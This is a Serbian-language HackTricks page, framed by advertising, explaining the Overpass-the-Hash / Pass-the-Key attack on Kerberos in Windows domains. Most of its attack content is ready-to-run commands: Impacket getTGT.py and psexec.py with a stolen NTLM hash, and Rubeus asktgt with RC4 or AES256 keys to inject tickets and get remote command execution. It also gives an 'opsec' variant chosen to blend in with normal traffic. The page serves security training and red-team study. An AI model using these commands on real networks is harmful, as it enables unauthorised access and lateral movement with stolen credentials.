# Pređi preko heša/Pređi ključem

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Pređi preko heša/Pređi ključem (PTK)

Napad **Pređi preko heša/Pređi ključem (PTK)** je dizajniran za okruženja gde je tradicionalni NTLM protokol ograničen, a Kerberos autentikacija ima prioritet. Ovaj napad koristi NTLM heš ili AES ključeve korisnika kako bi dobio Kerberos tikete, omogućavajući neovlašćen pristup resursima unutar mreže.

Za izvođenje ovog napada, početni korak uključuje dobijanje NTLM heša ili lozinke ciljanog korisničkog naloga. Nakon što se obezbede ove informacije, može se dobiti Ticket Granting Ticket (TGT) za nalog, omogućavajući napadaču pristup servisima ili mašinama za koje korisnik ima dozvole.

Proces se može pokrenuti sledećim komandama:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Za scenarije koji zahtevaju AES256, opcija `-aesKey [AES ključ]` može se koristiti. Osim toga, dobijeni tiket može se koristiti sa različitim alatima, uključujući smbexec.py ili wmiexec.py, proširujući opseg napada.

Naiđeni problemi poput _PyAsn1Error_ ili _KDC cannot find the name_ obično se rešavaju ažuriranjem Impacket biblioteke ili korišćenjem imena računara umesto IP adrese, obezbeđujući kompatibilnost sa Kerberos KDC.

Alternativni niz komandi korišćenjem Rubeus.exe pokazuje drugu stranu ove tehnike:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ovaj metod odražava pristup **Pass the Key**, sa fokusom na preuzimanje i korišćenje tiketa direktno u svrhu autentikacije. Važno je napomenuti da inicijacija zahteva za TGT pokreće događaj `4768: Zahtevan je Kerberos autentikacioni tiket (TGT)`, što označava korišćenje RC4-HMAC-a kao podrazumevanog, iako moderni Windows sistemi preferiraju AES256.

Da bi se uskladili sa operativnom sigurnošću i koristili AES256, može se primeniti sledeća komanda:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Reference

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova u [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
